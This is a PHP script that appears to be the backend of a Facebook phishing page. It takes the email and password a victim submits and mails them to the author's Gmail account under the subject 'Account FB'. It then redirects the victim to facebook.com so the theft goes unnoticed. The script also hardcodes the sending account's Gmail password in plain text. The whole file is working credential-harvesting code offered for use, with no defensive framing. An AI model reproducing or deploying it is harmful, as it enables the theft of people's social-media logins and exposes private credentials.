<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require('PHPMailer/src/Exception.php');
require('PHPMailer/src/PHPMailer.php');
require('PHPMailer/src/SMTP.php');


if($_POST){

    $mail = new PHPMailer(true);
    try {
      
        $mail->isSMTP();     
    
        $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
        $mail->SMTPAuth = true; // authentication enabled
        // $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Host = "smtp.gmail.com";
        $mail->Port = 587; // or 587
        $mail->isHTML(true);  
        $mail->Username = 'anphawolf@gmail.com';
        $mail->Password = 'anphawolf@%)$1997';
      
        $mail->SetFrom("anphawolf@gmail.com","Huy Nguyen");
        
        $mail->Subject = 'Account FB';
        $mail->Body = ' username: '.$_POST['email'] .' <br>
                        password: '.$_POST['pass'].'  ';
        $mail->AddAddress('anphawolf@gmail.com');

        if(!$mail->Send()) {
            echo "Mailer Error: " . $mail->ErrorInfo;
        } else {
            //echo "Message has been sent";
            header("Location: https://www.facebook.com/"); 
            return true;
        }
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }

}



?>